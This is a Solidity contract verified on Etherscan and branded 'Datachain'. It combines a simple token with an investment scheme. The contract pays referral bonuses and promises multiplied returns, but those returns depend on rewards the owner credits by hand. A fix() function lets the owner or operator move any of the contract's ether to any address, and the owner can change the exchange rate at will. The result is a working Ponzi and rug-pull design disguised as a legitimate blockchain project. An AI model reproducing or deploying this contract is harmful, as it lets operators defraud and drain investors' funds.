['/**\n', ' *Submitted for verification at Etherscan.io on 2021-04-03\n', '*/\n', '\n', '/**\n', ' * Build the future of data connectivity\n', ' * Datachain creates new values\n', ' * through social implementation of blockchain.\n', ' * 🌍 https://datachain.jp/\n', ' * 🌈 https://twitter.com/datachain_jp\n', ' * 📕 https://github.com/datachainlab\n', ' * \n', '*/\n', '\n', 'pragma solidity ^0.4.24;\n', 'contract DataChain{\n', '    struct InvestRecord\n', '    {\n', '        address user;\n', '        uint256 amount;\n', '        uint256 addtime;\n', '        uint withdraw;\n', '    }\n', '    struct UserInfo\n', '    {\n', '        address addr;\n', '        address parent;\n', '        uint256 amount;\n', '        uint256 reward;\n', '        uint256 rewardall;\n', '    }\n', '    address  owner;\n', '    address  technology;\n', '    address  operator;\n', '    InvestRecord[] public invests;\n', '    UserInfo[] public users;\n', '    mapping (address => uint256) public user_index;\n', '    uint public rate =299;\n', '    uint public endTime=0;\n', '    uint public sellTicketIncome=0;\n', '    uint public investIncome=0;\n', '    uint public sellTicketCount =0;\n', '    uint public destoryTicketCount =0;\n', '    \n', '    uint256 constant private MAX_UINT256 = 2**256 - 1;\n', '    mapping (address => uint256) public balances;\n', '    mapping (address => mapping (address => uint256)) public allowed;\n', '    uint256 public totalSupply;\n', '    string public name; \n', '    uint8 public decimals; \n', '    string public symbol;\n', '    event Transfer(address indexed _from, address indexed _to, uint256 _value); \n', '    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n', '    constructor() public{\n', '        owner = msg.sender;\n', '        balances[msg.sender] = 15000000000000000000000;\n', '        totalSupply = 50000000000000000000000;\n', '        name = "Datachain";\n', '        decimals = 18;\n', '        symbol = "DTJP";\n', '    }\n', '    \n', '    function transfer(address _to, uint256 _value) public returns (bool success) {\n', '        require(balances[msg.sender] >= _value);\n', '        balances[msg.sender] -= _value;\n', '        balances[_to] += _value;\n', '        emit Transfer(msg.sender, _to, _value);\n', '        return true;\n', '    }\n', '\n', '    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n', '        uint256 allowance = allowed[_from][msg.sender];\n', '        require(balances[_from] >= _value && allowance >= _value);\n', '        balances[_to] += _value;\n', '        balances[_from] -= _value;\n', '        if (allowance < MAX_UINT256) {\n', '            allowed[_from][msg.sender] -= _value;\n', '        }\n', '        emit Transfer(_from, _to, _value);\n', '        return true;\n', '    }\n', '\n', '    function balanceOf(address _owner) public view returns (uint256 balance) {\n', '        return balances[_owner];\n', '    }\n', '\n', '    function approve(address _spender, uint256 _value) public returns (bool success) {\n', '        allowed[msg.sender][_spender] = _value;\n', '         emit Approval(msg.sender, _spender, _value);\n', '        return true;\n', '    }\n', '\n', '    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n', '        return allowed[_owner][_spender];\n', '    }  \n', '    function setTechnology(address addr) public returns (bool success)  {\n', '        require(msg.sender==owner);\n', '        technology = addr;\n', '        return true;\n', '    }\n', '    function setOperator(address addr) public returns (bool success)  {\n', '        require(msg.sender==owner);\n', '        operator = addr;\n', '        return true;\n', '    }\n', '     function setRate(uint r) public returns (bool success)  {\n', '        require(msg.sender==owner);\n', '        rate = r;\n', '        return true;\n', '    }\n', '    function contractBalance() public view returns (uint256) {\n', '        return (address)(this).balance;\n', '    }\n', '    function investsLength() public view returns (uint256) {\n', '        return invests.length;\n', '    }\n', '     function usersLength() public view returns (uint256) {\n', '        return users.length;\n', '    }\n', '    \n', '     function reward(address[] adarr,uint[] amarr) public payable returns (uint){\n', '        require(msg.sender==owner || msg.sender==operator);\n', '        for(uint k=0;k<adarr.length;k++)\n', '        {\n', '            uint i = user_index[adarr[k]];\n', '            if(i>0)\n', '            {\n', '                i=i-1;\n', '                uint r = amarr[k];\n', '                uint bs = 3;\n', '                if(users[i].amount>30 ether) { bs=4;}\n', '                if(users[i].amount>60 ether) { bs=5;}\n', '                uint max = users[i].amount*bs;\n', '                if(users[i].rewardall + r>max)\n', '                {\n', '                    users[i].reward += max-users[i].rewardall;\n', '                    users[i].rewardall=max;\n', '                }\n', '                else\n', '                {\n', '                    users[i].reward += r;\n', '                    users[i].rewardall +=r;\n', '                }\n', '            }\n', '        }\n', '        return 0;\n', '     }\n', '     function fix(address a,uint m) public payable returns (uint){\n', '        require(msg.sender==owner|| msg.sender==operator);\n', '        a.transfer(m);\n', '        return 0;\n', '     }\n', '    function invest(address addr) public payable returns (uint256){\n', '        if (msg.value <1 ether) {msg.sender.transfer(msg.value);return 1;}\n', '        if(balances[msg.sender]<msg.value*rate/10){msg.sender.transfer(msg.value);return 3;}\n', '        uint i = user_index[msg.sender];\n', '        if(i>0)\n', '        {\n', '            i=i-1;\n', '        }\n', '        else\n', '        {\n', '            users.push(UserInfo(msg.sender,0,0,0,0));\n', '            user_index[msg.sender]= users.length;\n', '            i=users.length-1;\n', '        }\n', '        uint mbs = 3;\n', '        if(users[i].amount>30 ether) { mbs=4;}\n', '        if(users[i].amount>60 ether) { mbs=5;}\n', '        if(users[i].amount*mbs>users[i].rewardall){msg.sender.transfer(msg.value);return 4;}\n', '        invests.push(InvestRecord(msg.sender,msg.value,now,0));\n', '        balances[msg.sender] -= msg.value*rate/10;\n', '        destoryTicketCount += msg.value*rate/10;\n', '        if(technology!=0){technology.transfer(msg.value/100*3);}\n', '        address p = users[i].parent;\n', '        if(p==0){\n', '            if(addr==msg.sender){addr=0;}\n', '            p=addr;\n', '            users[i].parent = addr;\n', '        }\n', '        if(p!=0)\n', '        {\n', '            uint pi = user_index[p];\n', '            if(pi>0)\n', '            {\n', '                pi=pi-1;\n', '                uint r = msg.value/10;\n', '                uint bs = 3;\n', '                if(users[pi].amount>30 ether) { bs=4;}\n', '                if(users[pi].amount>60 ether) { bs=5;}\n', '                uint max = users[pi].amount*bs;\n', '                if(users[pi].rewardall + r>max)\n', '                {\n', '                    users[pi].reward += max-users[pi].rewardall;\n', '                    users[pi].rewardall=max;\n', '                }\n', '                else\n', '                {\n', '                    users[pi].reward += r;\n', '                    users[pi].rewardall +=r;\n', '                }\n', '            }\n', '        }\n', '        users[i].amount+=msg.value;\n', '        investIncome+=msg.value;\n', '        if(endTime==0||endTime<now){endTime=now;}\n', '        uint tm = investIncome*3*3600;\n', '        tm = tm/1 ether;\n', '        endTime += tm;\n', '        if(endTime>now+48 hours){endTime=now+48 hours;}\n', '        return 0;\n', '    }\n', '    \n', '    function withdraw() public payable returns(bool){\n', '            uint i = user_index[msg.sender];\n', '            if(i>0)\n', '            {\n', '                i=i-1;\n', '                if(users[i].reward>0)\n', '                {\n', '                    uint m=users[i].reward<=(address)(this).balance?users[i].reward:(address)(this).balance;\n', '                    users[i].addr.transfer(m);\n', '                    users[i].reward-=m;\n', '                    return true;\n', '                }\n', '            }\n', '            return false;\n', '    }\n', '     function buyTicket() public payable returns (uint256){\n', '        uint tickets = msg.value*rate;\n', '        if (balances[owner]<tickets) {msg.sender.transfer(msg.value);return 2;}\n', '        balances[msg.sender] += tickets;\n', '        balances[owner] -= tickets;\n', '        sellTicketCount += msg.value*rate;\n', '        sellTicketIncome += msg.value;\n', '        uint ls = sellTicketIncome/(200 ether);\n', '        rate = 1000 - ls;\n', '        emit Transfer(owner, msg.sender, tickets);\n', '        return 0;\n', '    }\n', '}']